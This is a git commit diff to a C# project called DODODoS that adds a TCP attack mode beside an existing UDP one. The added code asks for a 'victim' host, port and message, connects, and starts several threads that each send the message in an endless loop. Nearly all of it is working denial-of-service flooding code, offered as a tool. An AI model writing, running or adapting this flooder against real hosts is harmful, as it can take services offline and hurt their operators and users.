b18f7aa04a32b72fd77329ef5b03e51acae4b241
Matteo Bonora <matteo.bonora@marconirovereto.it>
2015-04-28 22:39:50 +0200

    Added the TCP attack interface

--- DODODoS/DODODoS/Program.cs
+++ DODODoS/DODODoS/Program.cs
@@ -8,11 +8,11 @@ namespace DODODoS
 {
     class Program
     {
+        static Dictionary<String, Action> cmd;
         static void Main(string[] args)
         {
-            bool exit=true;
-            Dictionary<String, Action> cmd = new Dictionary<string, Action>();
-            cmd.Add("udp",new Action(UDP));
+            bool exit = true;
+            LoadCommands();
 
             while (exit)
             {
@@ -21,7 +21,25 @@ namespace DODODoS
                 cmd[command]();
             }
         }
+        /// <summary>
+        /// Loads the various commands in the dictionary
+        /// </summary>
+        static void LoadCommands()
+        {
+            cmd = new Dictionary<string, Action>();
+            cmd.Add("udp", new Action(UDP));
+            cmd.Add("tcp", new Action(TCP));
+            cmd.Add("exit", new Action(Exit));
+        }
 
+        static void Exit()
+        {
+            Environment.Exit(0);
+        }
+
+        /// <summary>
+        /// Starts a UDP attack
+        /// </summary>
         static void UDP()
         {
             DODODoS.UDP victim = new DODODoS.UDP();
@@ -33,7 +51,24 @@ namespace DODODoS
             byte[] message = Encoding.ASCII.GetBytes(Console.ReadLine());
 
             victim.Connect(host, port);
-            victim.Attack(message, 4);
+            victim.Attack(message, Environment.ProcessorCount * 2);
+        }
+
+        /// <summary>
+        /// Starts a TCp attack
+        /// </summary>
+        static void TCP()
+        {
+            DODODoS.TCP victim = new DODODoS.TCP();
+            Console.Write("Victim: ");
+            string host = Console.ReadLine();
+            Console.Write("Port: ");
+            int port = Convert.ToInt32(Console.ReadLine());
+            Console.Write("Message: ");
+            byte[] message = Encoding.ASCII.GetBytes(Console.ReadLine());
+
+            victim.Connect(host, port);
+            victim.Attack(message, Environment.ProcessorCount * 2);
         }
     }
 }
--- DODODoS/DODODoS/TCP.cs
+++ DODODoS/DODODoS/TCP.cs
@@ -1,13 +1,57 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
+using System.Net;
+using System.Net.Sockets;
 
 namespace DODODoS
 {
     public class TCP
     {
+        TcpClient client;
 
+        public TCP()
+        {
+            client = new TcpClient();
+        }
+
+        public bool Connect(string host, int port)
+        {
+            try
+            {
+                client.Connect(host, port);
+                return true;
+            }
+            catch (SocketException e)
+            {
+                return false;
+            }
+        }
+
+        public bool Attack(byte[] message, int thread)
+        {
+            if (thread == 1)
+            {
+                while (true)
+                {
+                    try
+                    {
+                        client.Client.Send(message);
+                    }
+                    catch (SocketException e)
+                    {
+                        return false;
+                    }
+                }
+            }
+            else
+            {
+                for (int i = 0; i < thread; i++)
+                {
+                    new Thread(() => Attack(message, 1)).Start();
+                }
+            }
+            return true;
+        }
     }
 }
